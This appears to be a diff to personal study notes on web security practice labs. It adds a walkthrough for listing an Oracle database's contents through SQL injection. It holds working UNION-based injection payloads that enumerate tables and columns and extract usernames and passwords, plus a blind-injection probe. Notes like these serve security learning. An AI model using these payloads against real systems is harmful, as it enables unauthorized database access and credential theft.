@@ -167,6 +167,13 @@ xyz is tracking id
 
 Theory:-  Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database.
 
+#10 Lab: SQL injection attack, listing the database contents on Oracle
+
+    1. Open any category parameter and use this payload '+UNION+SELECT+'abc','def'+FROM+dual--
+    2. Then '+UNION+SELECT+table_name,NULL+FROM+all_tables--
+    3. '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+    4. '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+
 #10 Lab:Blind SQL injection with conditional errors
 
     1.trackingid=xyz' (see response for internal error)
